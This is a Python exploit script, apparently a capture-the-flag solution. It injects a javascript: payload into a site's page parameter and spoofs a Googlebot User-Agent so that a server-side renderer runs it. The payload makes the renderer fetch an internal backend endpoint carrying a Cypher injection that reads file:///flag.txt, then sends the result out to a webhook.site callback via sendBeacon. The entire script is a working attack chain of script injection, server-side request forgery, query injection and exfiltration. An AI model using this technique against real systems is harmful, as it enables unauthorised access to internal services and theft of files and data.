import base64
from requests import *
from urllib.parse import quote

url = "http://seoftwrevenge.fword.tech/best_mangas?page=javascript:"
callback = "https://webhook.site/6d052b90-69a1-4532-b24e-2b402975d501"
headers = {"User-Agent": "Googlebot/2.1 (+http://www.googlebot.com/bot.html)"}
request = """http://backend:5000/secret?name=Naruto" CALL db.labels() YIELD label LOAD CSV FROM 'file:///flag.txt' as a RETURN a//""".encode()
request = base64.b64encode(request).decode()
payload = """navigator.sendBeacon(`"""+callback+"""/start`);
xhr = new XMLHttpRequest();
xhr.open("GET",atob('"""+request+"""'),false);
xhr.send();
navigator.sendBeacon('"""+callback+"""/end', atob('"""+request+"""'));
navigator.sendBeacon('"""+callback+"""/end', xhr.responseText);
""".replace("\n","")
print(quote(payload))
res = get(url+payload, headers=headers)
print(res.text)
